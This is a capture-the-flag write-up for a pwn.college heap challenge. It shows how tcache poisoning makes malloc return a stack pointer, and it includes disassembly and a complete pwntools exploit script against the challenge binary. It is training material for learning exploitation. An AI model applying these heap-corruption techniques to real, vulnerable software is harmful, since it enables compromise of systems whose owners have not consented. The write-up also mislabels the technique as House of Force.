---
layout: post
title: (Dynamic Allocator Misuse) level 12
categories: pwn.college Dynamic-Allocator-Misuse
date: 2025-10-08 08:00:22 +0300
tags: pwn.college PIE ASLR heap house-of-force tecache metadata house-of-spirit
---
## Information
- category: pwn


## Description 
> Leverage TCACHE exploits to cause malloc() to return a stack pointer.

## Write-up

**Goal:** leak a stack address, pivot `malloc` to return a pointer into stack memory.

---

### Step 1 — Leak stack address

From reverse engineering, we see this snippet in the binary:
```c
0x00005ef6bebb299e <+1304>: mov edi,0x43
0x00005ef6bebb29a3 <+1309>: call malloc@plt
0x00005ef6bebb29a8 <+1314>: mov QWORD PTR [rbp-0x198],rax
0x00005ef6bebb29af <+1321>: lea rax,[rbp-0x90]
0x00005ef6bebb29b6 <+1328>: add rax,0x40
0x00005ef6bebb29ba <+1332>: cmp QWORD PTR [rbp-0x198],rax
```

This shows malloc returning a pointer close to `rbp-0x90`.  
We can abuse this to leak a stack address:

1. `malloc(0x43)` → index 0.  
2. `free(0)`.  
3. Use `scanf` into chunk 0 to overwrite its header so that `malloc` later returns a pointer inside the stack frame.

Reverse engineering also shows:

```c
0x00005ef6bebb2958 <+1234>: lea rax,[rbp-0x90]
0x00005ef6bebb295f <+1241>: mov rsi,rax
0x00005ef6bebb2962 <+1244>: lea rdi,[rip+0x814] ; scanf format
```

So we can use `scanf` to write directly to `rbp-0x90`.

---

### Step 2 — House of Force to pivot malloc to stack

Technique:
- Padding of `0x30`
- Fake metadata (`prev_size`, `size`) such that the next malloc size will cause allocation into `rbp-0x90 + 0x40`.

Example sequence:

1. `malloc(0x43)`
2. `free(0)`
3. `scanf(0, p64(stackLeak))` → overwrite header to point to `rbp-0x90 + 0x40`
4. `malloc(0, 0x43)` → returns pointer to stack

---




## Exploit
```python
from pwn import *

elf = context.binary = ELF("/challenge/babyheap_level12.1")
context.log_level = "debug"
global p
p = elf.process()

def malloc_stack_win():
    p.sendline(b"stack_malloc_win")

def stack_free():
    p.sendline(b"stack_free")

def stack_scanf(data):
    p.sendline(b"stack_scanf")
    p.sendline(data)

def malloc(idx,size):
    p.sendline(b"malloc")
    p.sendline(idx)
    p.sendline(size)

def free(idx):
    p.sendline(b"free")
    p.sendline(idx)

def scanf(idx,data):
    p.sendline(b"scanf")
    p.sendline(idx)
    p.sendline(data)

def puts(idx):
    p.sendline(b"puts")
    p.sendline(idx)

def quit():
    p.sendline(b"quit")

def exploit():
    malloc(b"0",b"32")

    payload = b"\x42"*0x30 + p64(0) + p64(0x30)

    stack_scanf(payload)
    stack_free()

    free(b"0")

    puts(b"0")

    p.recvuntil(b"Data: ")
    stack = u64(p.recvline().strip().ljust(8,b"\x00"))
    log.success(f"stack: {hex(stack)}")
    
    malloc(b"0",b"67")
    malloc(b"1",b"67")

    free(b"1")
    free(b"0")

    scanf(b"0",p64(stack))

    malloc(b"0",b"67")

    malloc_stack_win()
    quit()

    p.interactive()
    
def main():
    exploit()

if __name__ == "__main__":
    main()
```